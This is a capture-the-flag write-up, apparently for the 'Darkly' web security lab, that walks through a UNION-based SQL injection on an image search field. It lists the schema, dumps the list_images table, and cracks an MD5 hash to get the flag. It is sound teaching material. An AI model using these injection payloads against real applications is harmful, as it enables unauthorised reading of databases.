
### Search images by ID

This breach is the same as the MEMBERS breach, explained -> SQL Injection Members[https://github.com/guysharony/darkly/blob/main/SQL%20Injection%20MEMBERS/Ressources/explanations.md]


``1 UNION SELECT column_name, table_name FROM information_schema.columns``

```
ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
Title: list_images
Url : id

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
Title: list_images
Url : url

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
Title: list_images
Url : title

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
Title: list_images
Url : comment

```

We successfully retrieved all the corresponding tables and columns:

- id
- url
- title
- comment

Therefore, we can extract data from the users table with the following command:

``1 UNION SELECT url, title FROM list_images``

``` 
ID: 1 UNION SELECT url, title FROM list_images 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 UNION SELECT url, title FROM list_images 
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 1 UNION SELECT url, title FROM list_images 
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 1 UNION SELECT url, title FROM list_images 
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 1 UNION SELECT url, title FROM list_images 
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```
Hack me ? Ok, this one seems interesting !
We have identified the table corresponding to the Flag; the rest should be in the other columns. A simple search among several columns will display the flag.

``1 UNION SELECT title, comment FROM list_images``

```
ID: 1 UNION SELECT title, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

###Decrypt the password

To decrypt the password, we use the MD5 Decrypt tool, converting ``1928e8083cf461a51303633093573c46`` to ``albatroz``, then encrypt it with a SHA-256 tool, resulting in ``f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188``.
